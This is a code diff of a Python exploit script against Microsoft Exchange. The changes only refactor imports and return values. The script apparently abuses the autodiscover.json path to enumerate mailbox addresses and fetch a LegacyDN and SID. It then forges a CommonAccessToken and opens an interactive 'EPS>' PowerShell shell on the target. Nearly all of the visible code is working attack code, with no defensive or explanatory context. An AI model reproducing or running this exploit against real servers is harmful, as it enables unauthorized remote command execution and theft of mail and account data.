@@ -1,10 +1,10 @@
 import sys
 
-import base64
-import re
 import urllib3
 import requests
+from re import findall
 from struct import pack
+from base64 import b64encode
 
 from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
@@ -45,7 +45,7 @@ def getToken(uname, sid):
     raw_token += group_data
     raw_token += ext_data
 
-    data = base64.b64encode(raw_token).decode()
+    data = b64encode(raw_token).decode()
 
     return data
 
@@ -62,14 +62,15 @@ def getMail(target):
             xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
             xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
         >
-        <soap:Body>
-            <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
-                <m:UnresolvedEntry>smtp</m:UnresolvedEntry> 
-            </m:ResolveNames>
-        </soap:Body>
-    </soap:Envelope>"""
+            <soap:Body>
+                <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
+                    <m:UnresolvedEntry>smtp</m:UnresolvedEntry> 
+                </m:ResolveNames>
+            </soap:Body>
+        </soap:Envelope>
+    """
     resb = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
-    email_list = re.findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)
+    email_list = findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)
     return email_list
 
 def exploit(target):
@@ -110,7 +111,7 @@ def exploit(target):
         }
         resc = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
         if f"DisplayName" in resc.text:
-            legacydn = re.findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
+            legacydn = findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
             print(f"[+] LegacyDN: {legacydn}")
         else:
             print("[-] No LegacyDN")
@@ -141,7 +142,7 @@ def exploit(target):
 
         token = getToken(usera, sid)
         print(f"[+] CommonAccessToken: {token}")
-        return token
+        return usera, sid, token
 
     except requests.exceptions.RequestException as e:
         print(f"[ReqError]: {e}\n=>{target}")
@@ -167,7 +168,8 @@ def execmdlet(server, token, **kwargs):
 def main(argv):
     server = argv[1]
     target = f"https://{server}"
-    token = exploit(target)
+
+    usera, sid, token = exploit(target)
     while True:
         pscript = input("\033[92mEPS> \033[0m")
         if "exit" == pscript:
